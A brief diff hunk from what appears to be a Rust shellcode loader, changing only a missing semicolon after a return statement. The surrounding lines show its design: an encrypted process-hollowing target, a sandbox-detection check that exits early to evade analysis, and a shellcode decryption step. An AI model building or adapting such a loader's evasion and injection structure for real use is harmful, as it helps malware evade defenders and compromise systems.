@@ -37,7 +37,7 @@ const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_WINDOWS_HOLLOWING_TARGET;
 fn main() {
     // Runs the sandbox detection function or the dummy replacement, dependent on features
     if rco_utils::pound_sand() {
-        return
+        return;
     }
 
     // Decrypts the shellcode and target process or returns them unchanged, dependent on features
